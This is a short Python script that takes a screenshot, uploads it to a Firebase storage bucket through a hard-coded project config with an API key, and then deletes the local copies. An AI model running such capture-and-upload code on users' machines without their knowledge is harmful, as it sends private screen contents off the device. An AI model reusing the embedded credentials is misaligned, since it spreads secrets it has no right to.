
# to download the file
# storage.child(cloud_path).download('/images', 'screentap-3.png')

#------------------------------------------------------------------------------
import pyscreenshot
import pyrebase
import os
import shutil

firebaseConfig = {
    "apiKey": "AIzaSyAk0xzpUuH0LYXihigz3OXentCn1T8YC3Q",
    "authDomain": "global-testing-env.firebaseapp.com",
    "databaseURL": "https://global-testing-env-default-rtdb.firebaseio.com",
    "projectId": "global-testing-env",
    "storageBucket": "global-testing-env.appspot.com",
    "messagingSenderId": "403456253125",
    "appId": "1:403456253125:web:129423ef3a31c45a5a24ac"
}

firebase = pyrebase.initialize_app(firebaseConfig)
storage = firebase.storage()


def grab_screenshot():
    i = 0
    # To capture the screen
    image = pyscreenshot.grab()

    if not os.path.exists("./output/"):
        os.makedirs("./output/")

    while os.path.exists(f"output/file_{i}.png"):
        i += 1

    # To save the screenshot
    image.save(f"output/file_{i}.png")
    print("image saved")
    upload_firebase()


def upload_firebase():
    i = 0
    # looping equal to the number of files available in the folder
    for x in range(len(os.listdir(os.getcwd() + "/output"))):
        if os.path.exists(f"output/file_{i}.png"):
            cloud_path = f"images/file_{i}.png"
            local_path = f"output/file_{i}.png"
            storage.child(cloud_path).put(local_path)
            i += 1
            print("image uploaded")

grab_screenshot()
# to remove output dir
shutil.rmtree("output")
